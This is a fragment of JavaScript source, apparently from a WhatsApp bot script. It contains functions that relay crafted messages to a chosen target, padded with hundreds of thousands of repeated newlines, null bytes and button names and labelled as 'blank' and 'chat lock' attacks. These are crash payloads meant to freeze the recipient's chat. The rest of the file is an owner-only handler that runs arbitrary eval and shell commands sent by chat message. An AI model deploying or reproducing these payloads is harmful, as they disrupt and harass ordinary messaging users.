                stanzaId: "THIS IS zGALAXY" + Date.now()
            }
        }
      };
      
 await client.relayMessage(target, nanz, {
 messageId: null,
 participant: { jid: target },
 viewOnceMessage: {},
 })
}    
        
async function VnXBlankXChatLockNew(client, target) {
  await client.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "VnX New Nihk",
            footer: "VnX Nihk"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                 buttonParamsJson: JSON.stringify({
                 title: "\n".repeat(250000)
              },
              {
                name: "voice_call".repeat(250000), 
                 buttonParamsJson: "\0".repeat(250000)
                }),
              }           
            ]
          }
        }
      }   
    }
  }, {
    participant: { jid: target }
  });
}  
        
// ===================== Async Eval (Prefix: <) =======================
    if (budy.startsWith('<')) {
        if (!isCreator) return;

        function Return(sul) {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined) {
                bang = util.format(sul)
            }
            return reply(bang)
        }

        try {
            reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
        } catch (e) {
            reply(String(e))
        }
    }

// ===================== Eval Biasa (Prefix: >) =======================
    if (budy.startsWith('>')) {
        if (!isCreator) return;

        try {
            let evaled = await eval(budy.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            await reply(evaled)
        } catch (err) {
            await reply(String(err))
        }
    }

// ===================== Terminal Command (Prefix: $) ===============
    if (budy.startsWith('$')) {
        if (!isCreator) return;

        require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(`${err}`)
            if (stdout) return reply(stdout)
        })
    }

}
} catch (err) {
    console.log(require("util").format(err));
}

    // ===================== Auto Update ===============================
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m'+__filesname+' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})
}
// ===================== End All ===================================